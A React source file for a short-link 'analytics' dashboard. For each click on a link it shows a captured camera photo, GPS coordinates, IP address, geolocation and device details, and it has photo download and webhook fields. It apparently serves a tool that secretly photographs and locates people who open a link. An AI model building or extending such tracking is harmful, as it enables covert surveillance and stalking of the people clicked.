
import React, { useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Calendar, ExternalLink, Globe, MapPin, Monitor, Smartphone, Users, Eye, BarChart3, Camera, RefreshCw, Download } from 'lucide-react';
import { useLanguage } from '@/hooks/useLanguage';
import { supabase } from '@/integrations/supabase/client';

interface LinkData {
  id: string;
  original_url: string;
  short_code: string;
  webhook: string | null;
  created_at: string;
}

interface TrackingData {
  id: number;
  created_at: string;
  type: string;
  data: any;
  ip_address: string | null;
  user_agent: string | null;
  latitude: number | null;
  longitude: number | null;
  yuuka: string | null;
}

const ShortcodeDashboard = () => {
  const { shortcode } = useParams<{ shortcode: string }>();
  const [linkData, setLinkData] = useState<LinkData | null>(null);
  const [trackingData, setTrackingData] = useState<TrackingData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [imageDimensions, setImageDimensions] = useState<{[key: string]: {width: number, height: number}}>({});
  const { t } = useLanguage();

  const fetchData = async () => {
    if (!shortcode) return;

    try {
      // Fetch link data
      const { data: linkInfo, error: linkError } = await supabase
        .from('yuuka')
        .select('*')
        .eq('short_code', shortcode)
        .single();

      if (linkError) {
        console.error('Error fetching link data:', linkError);
        return;
      }

      setLinkData(linkInfo);

      // Fetch tracking data
      const { data: tracking, error: trackingError } = await supabase
        .from('tracking_data')
        .select('*')
        .eq('short_code', shortcode)
        .order('created_at', { ascending: false });

      if (trackingError) {
        console.error('Error fetching tracking data:', trackingError);
        return;
      }

      setTrackingData(tracking || []);
    } catch (error) {
      console.error('Unexpected error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, [shortcode]);

  const handleRefresh = () => {
    setIsLoading(true);
    fetchData();
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const getDeviceType = (userAgent: string | null) => {
    if (!userAgent) return t('unknown');
    if (/Mobile|Android|iPhone/i.test(userAgent)) return 'Mobile';
    if (/Tablet|iPad/i.test(userAgent)) return 'Tablet';
    return 'Desktop';
  };

  const formatLocation = (lat: number | null, lng: number | null) => {
    if (!lat || !lng) return t('unknown');
    return `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
  };

  const openGoogleMaps = (lat: number | null, lng: number | null) => {
    if (!lat || !lng) return;
    const url = `https://www.google.com/maps?q=${lat},${lng}`;
    window.open(url, '_blank');
  };

  const loadImageDimensions = (imageUrl: string, imageKey: string) => {
    if (imageDimensions[imageKey]) return;
    
    const img = new Image();
    img.onload = () => {
      setImageDimensions(prev => ({
        ...prev,
        [imageKey]: { width: img.naturalWidth, height: img.naturalHeight }
      }));
    };
    img.src = imageUrl;
  };

  const downloadImage = async (imageUrl: string, fileName?: string) => {
    try {
      const response = await fetch(imageUrl);
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = fileName || `photo-${Date.now()}.jpg`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);
    } catch (error) {
      console.error('Error downloading image:', error);
    }
  };

  const getOptimalImageSize = (naturalWidth: number, naturalHeight: number, maxWidth: number = 400, maxHeight: number = 300) => {
    const aspectRatio = naturalWidth / naturalHeight;
    
    if (naturalWidth <= maxWidth && naturalHeight <= maxHeight) {
      return { width: naturalWidth, height: naturalHeight };
    }
    
    if (aspectRatio > 1) {
      // Landscape
      const width = Math.min(naturalWidth, maxWidth);
      const height = width / aspectRatio;
      return { width, height };
    } else {
      // Portrait or square
      const height = Math.min(naturalHeight, maxHeight);
      const width = height * aspectRatio;
      return { width, height };
    }
  };

  const renderTrackingCard = (item: TrackingData, index: number) => {
    const deviceType = getDeviceType(item.user_agent);
    
    switch (item.type) {
      case 'photo':
        const photoKey = `photo-${item.id}`;
        if (item.yuuka) {
          loadImageDimensions(item.yuuka, photoKey);
        }
        const photoDims = imageDimensions[photoKey];
        const photoSize = photoDims ? getOptimalImageSize(photoDims.width, photoDims.height) : { width: 400, height: 300 };
        
        return (
          <Card key={index} className="bg-white/10 backdrop-blur-lg border-white/20 transform transition-all duration-300 hover:scale-105 animate-fade-in hover:shadow-2xl hover:shadow-pink-500/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(236,72,153,0.6)]">
                <Camera className="w-5 h-5 text-pink-400 animate-pulse" />
                {t('photo_captured')}
              </CardTitle>
              <CardDescription className="text-blue-300 [text-shadow:0_0_8px_rgba(147,197,253,0.4)]">
                {formatDate(item.created_at)}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {item.yuuka && (
                <div className="relative group">
                  <img 
                    src={item.yuuka} 
                    alt="Captured photo" 
                    className="object-cover rounded shadow-lg"
                    style={{
                      width: `${photoSize.width}px`,
                      height: `${photoSize.height}px`,
                      maxWidth: '100%'
                    }}
                  />
                  <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                    <Button
                      size="sm"
                      onClick={() => downloadImage(item.yuuka!, `photo-${item.id}.jpg`)}
                      className="bg-pink-500/80 hover:bg-pink-600/90 text-white border-pink-400/30"
                    >
                      <Download className="w-4 h-4 mr-1" />
                      {t('download')}
                    </Button>
                  </div>
                  {photoDims && (
                    <div className="absolute bottom-2 left-2 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                      <Badge className="bg-black/50 text-white text-xs">
                        {photoDims.width} × {photoDims.height}
                      </Badge>
                    </div>
                  )}
                </div>
              )}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{deviceType}</p>
                </div>
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">IP:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.ip_address || t('unknown')}</p>
                </div>
                {item.latitude && item.longitude && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('location')}:</label>
                    <div className="flex items-center gap-2">
                      <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{formatLocation(item.latitude, item.longitude)}</p>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        onClick={() => openGoogleMaps(item.latitude, item.longitude)}
                        className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                      >
                        {t('view_on_map')}
                      </Button>
                    </div>
                  </div>
                )}
                {item.data?.deviceInfo && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device_info')}:</label>
                    <div className="grid grid-cols-2 gap-2 text-xs mt-1">
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('os')}: {item.data.deviceInfo.os || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('browser')}: {item.data.deviceInfo.browser || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('platform')}: {item.data.deviceInfo.platform || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('language')}: {item.data.deviceInfo.language || t('unknown')}</span>
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        );

      case 'location':
        return (
          <Card key={index} className="bg-white/10 backdrop-blur-lg border-white/20 transform transition-all duration-300 hover:scale-105 animate-fade-in hover:shadow-2xl hover:shadow-green-500/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(34,197,94,0.6)]">
                <MapPin className="w-5 h-5 text-green-400 animate-pulse" />
                {t('location_captured')}
              </CardTitle>
              <CardDescription className="text-blue-300 [text-shadow:0_0_8px_rgba(147,197,253,0.4)]">
                {formatDate(item.created_at)}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{deviceType}</p>
                </div>
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">IP:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.ip_address || t('unknown')}</p>
                </div>
                {item.latitude && item.longitude && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('gps_coordinates')}:</label>
                    <div className="flex items-center gap-2">
                      <p className="text-green-300 [text-shadow:0_0_8px_rgba(34,197,94,0.4)]">{formatLocation(item.latitude, item.longitude)}</p>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        onClick={() => openGoogleMaps(item.latitude, item.longitude)}
                        className="bg-white/10 border-white/20 text-white hover:bg-white/20"
                      >
                        {t('view_on_map')}
                      </Button>
                    </div>
                  </div>
                )}
                {item.data?.accuracy && (
                  <div>
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('accuracy')}:</label>
                    <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{Math.round(item.data.accuracy)} {t('meters')}</p>
                  </div>
                )}
                {item.data?.ipInfo && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('location_info')}:</label>
                    <div className="grid grid-cols-2 gap-2 text-xs mt-1">
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('country')}: {item.data.ipInfo.country || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('city')}: {item.data.ipInfo.city || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('region')}: {item.data.ipInfo.region || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('timezone')}: {item.data.ipInfo.timezone || t('unknown')}</span>
                    </div>
                  </div>
                )}
                {item.data?.deviceInfo && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device_info')}:</label>
                    <div className="grid grid-cols-2 gap-2 text-xs mt-1">
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('os')}: {item.data.deviceInfo.os || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('browser')}: {item.data.deviceInfo.browser || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('screen')}: {item.data.deviceInfo.screenWidth}×{item.data.deviceInfo.screenHeight}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('language')}: {item.data.deviceInfo.language || t('unknown')}</span>
                    </div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        );

      case 'ip_only':
        return (
          <Card key={index} className="bg-white/10 backdrop-blur-lg border-white/20 transform transition-all duration-300 hover:scale-105 animate-fade-in hover:shadow-2xl hover:shadow-blue-500/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(59,130,246,0.6)]">
                <Globe className="w-5 h-5 text-blue-400 animate-pulse" />
                {t('ip_only_capture')}
              </CardTitle>
              <CardDescription className="text-blue-300 [text-shadow:0_0_8px_rgba(147,197,253,0.4)]">
                {formatDate(item.created_at)}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{deviceType}</p>
                </div>
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('ip_address')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.ip_address || t('unknown')}</p>
                </div>
                {item.data?.ipInfo && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('ip_location')}:</label>
                    <div className="grid grid-cols-2 gap-2 text-xs mt-1">
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('country')}: {item.data.ipInfo.country || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('city')}: {item.data.ipInfo.city || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('region')}: {item.data.ipInfo.region || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('timezone')}: {item.data.ipInfo.timezone || t('unknown')}</span>
                    </div>
                  </div>
                )}
                {item.data?.deviceInfo && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device_info')}:</label>
                    <div className="grid grid-cols-2 gap-2 text-xs mt-1">
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('os')}: {item.data.deviceInfo.os || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('browser')}: {item.data.deviceInfo.browser || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('platform')}: {item.data.deviceInfo.platform || t('unknown')}</span>
                      <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{t('language')}: {item.data.deviceInfo.language || t('unknown')}</span>
                    </div>
                  </div>
                )}
                {item.data?.reason && (
                  <div className="md:col-span-2">
                    <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('reason')}:</label>
                    <p className="text-blue-300 text-xs [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.data.reason}</p>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        );

      default:
        return (
          <Card key={index} className="bg-white/10 backdrop-blur-lg border-white/20 transform transition-all duration-300 hover:scale-105 animate-fade-in">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">
                <Eye className="w-5 h-5 text-gray-400" />
                {t('unknown_capture')}
              </CardTitle>
              <CardDescription className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">
                {formatDate(item.created_at)}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('type')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.type}</p>
                </div>
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('device')}:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{deviceType}</p>
                </div>
                <div>
                  <label className="font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">IP:</label>
                  <p className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{item.ip_address || t('unknown')}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        );
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center">
        <div className="text-center animate-fade-in">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-white text-lg [text-shadow:0_0_10px_rgba(255,255,255,0.6)]">{t('loading_analytics')}</p>
        </div>
      </div>
    );
  }

  if (!linkData) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center">
        <div className="text-center animate-fade-in">
          <h1 className="text-2xl font-bold mb-4 text-white [text-shadow:0_0_12px_rgba(255,255,255,0.6)]">{t('page_not_found')}</h1>
          <Link to="/">
            <Button className="text-white">{t('go_home')}</Button>
          </Link>
        </div>
      </div>
    );
  }

  const totalClicks = trackingData.length;
  const uniqueIPs = new Set(trackingData.map(d => d.ip_address).filter(Boolean)).size;
  const photoCaptures = trackingData.filter(d => d.type === 'photo').length;
  const locationCaptures = trackingData.filter(d => d.type === 'location').length;
  const ipOnlyCaptures = trackingData.filter(d => d.type === 'ip_only').length;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 relative overflow-hidden">
      {/* Animated background */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-20 left-10 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse"></div>
        <div className="absolute bottom-20 right-10 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-xl opacity-20 animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 w-96 h-96 bg-pink-500 rounded-full mix-blend-multiply filter blur-xl opacity-10 animate-pulse delay-500"></div>
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8">
        <div className="mb-8 animate-fade-in">
          <Link to="/dashboard/shortcode" className="inline-flex items-center text-blue-300 hover:text-purple-300 transition-colors duration-200 mb-6 [text-shadow:0_0_8px_rgba(147,197,253,0.4)]">
            <ArrowLeft className="w-5 h-5 mr-2" />
            <span>{t('back_to_dashboard')}</span>
          </Link>
          
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-2 text-white bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent [text-shadow:0_0_20px_rgba(147,197,253,0.6)]">
              {t('link_analytics')}
            </h1>
            <p className="text-lg text-blue-300 [text-shadow:0_0_10px_rgba(147,197,253,0.4)]">{t('detailed_analytics')}</p>
            <Button
              onClick={handleRefresh}
              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white"
              disabled={isLoading}
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${isLoading ? 'animate-spin' : ''}`} />
              {t('refresh_data')}
            </Button>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
          {/* Link Info */}
          <Card className="lg:col-span-2 bg-white/10 backdrop-blur-lg border-white/20 animate-fade-in transform transition-all duration-300 hover:scale-105">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(255,255,255,0.5)]">
                <BarChart3 className="w-5 h-5 text-blue-400" />
                {t('original_link')}
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <label className="text-sm font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('original_url')}</label>
                <div className="flex items-center gap-2 mt-1">
                  <Badge variant="outline" className="bg-white/10 border-white/20 text-white">
                    <a href={linkData.original_url} target="_blank" rel="noopener noreferrer" className="text-blue-300 hover:text-purple-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">
                      {linkData.original_url}
                    </a>
                  </Badge>
                  <Button size="sm" variant="ghost" asChild>
                    <a href={linkData.original_url} target="_blank" rel="noopener noreferrer">
                      <ExternalLink className="w-4 h-4" />
                    </a>
                  </Button>
                </div>
              </div>
              
              <div>
                <label className="text-sm font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('short_link')}</label>
                <div className="mt-1">
                  <Badge variant="outline" className="bg-white/10 border-white/20 text-white">
                    <span className="text-green-300 [text-shadow:0_0_8px_rgba(34,197,94,0.4)]">{window.location.origin}/s/{shortcode}</span>
                  </Badge>
                </div>
              </div>
              
              <div>
                <label className="text-sm font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('created')}</label>
                <div className="mt-1">
                  <Badge variant="outline" className="bg-white/10 border-white/20 text-white">
                    <Calendar className="w-4 h-4 mr-2" />
                    <span className="text-blue-300 [text-shadow:0_0_6px_rgba(147,197,253,0.3)]">{formatDate(linkData.created_at)}</span>
                  </Badge>
                </div>
              </div>
              
              {linkData.webhook && (
                <div>
                  <label className="text-sm font-medium text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">{t('webhook_url')}</label>
                  <div className="mt-1">
                    <Badge variant="outline" className="bg-white/10 border-white/20 text-white">
                      <span className="text-purple-300 truncate max-w-xs [text-shadow:0_0_6px_rgba(168,85,247,0.3)]">{linkData.webhook}</span>
                    </Badge>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Stats */}
          <div className="space-y-4">
            <Card className="bg-white/10 backdrop-blur-lg border-white/20 animate-fade-in transform transition-all duration-300 hover:scale-105">
              <CardHeader className="pb-2">
                <CardTitle className="text-lg flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(255,255,255,0.5)]">
                  <Eye className="w-5 h-5 text-green-400" />
                  {t('total_clicks')}
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-3xl font-bold text-green-300 [text-shadow:0_0_15px_rgba(34,197,94,0.6)]">{totalClicks}</div>
              </CardContent>
            </Card>

            <Card className="bg-white/10 backdrop-blur-lg border-white/20 animate-fade-in transform transition-all duration-300 hover:scale-105">
              <CardHeader className="pb-2">
                <CardTitle className="text-lg flex items-center gap-2 text-white [text-shadow:0_0_10px_rgba(255,255,255,0.5)]">
                  <Users className="w-5 h-5 text-blue-400" />
                  {t('unique_visitors')}
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-3xl font-bold text-blue-300 [text-shadow:0_0_15px_rgba(59,130,246,0.6)]">{uniqueIPs}</div>
              </CardContent>
            </Card>

            <Card className="bg-white/10 backdrop-blur-lg border-white/20 animate-fade-in transform transition-all duration-300 hover:scale-105">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm flex items-center gap-2 text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">
                  <Camera className="w-4 h-4 text-pink-400" />
                  Photos: {photoCaptures}
                </CardTitle>
                <CardTitle className="text-sm flex items-center gap-2 text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">
                  <MapPin className="w-4 h-4 text-green-400" />
                  GPS: {locationCaptures}
                </CardTitle>
                <CardTitle className="text-sm flex items-center gap-2 text-white [text-shadow:0_0_8px_rgba(255,255,255,0.4)]">
                  <Globe className="w-4 h-4 text-blue-400" />
                  IP Only: {ipOnlyCaptures}
                </CardTitle>
              </CardHeader>
            </Card>
          </div>
        </div>

        {trackingData.length > 0 && (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-white text-center mb-6 [text-shadow:0_0_15px_rgba(255,255,255,0.6)]">
              {t('tracking_details')}
            </h2>
            
            <div className="grid grid-cols-1 gap-6">
              {trackingData.map((item, index) => (
                <div key={index} style={{ animationDelay: `${index * 0.1}s` }}>
                  {renderTrackingCard(item, index)}
                </div>
              ))}
            </div>
          </div>
        )}

        {trackingData.length === 0 && (
          <Card className="bg-white/10 backdrop-blur-lg border-white/20 animate-fade-in">
            <CardContent className="text-center py-12">
              <Eye className="w-16 h-16 text-gray-400 mx-auto mb-4 animate-pulse" />
              <h3 className="text-xl font-semibold mb-2 text-white [text-shadow:0_0_10px_rgba(255,255,255,0.5)]">{t('no_clicks_yet')}</h3>
              <p className="text-blue-300 [text-shadow:0_0_8px_rgba(147,197,253,0.4)]">{t('no_clicks_share_link')}</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
};

export default ShortcodeDashboard;
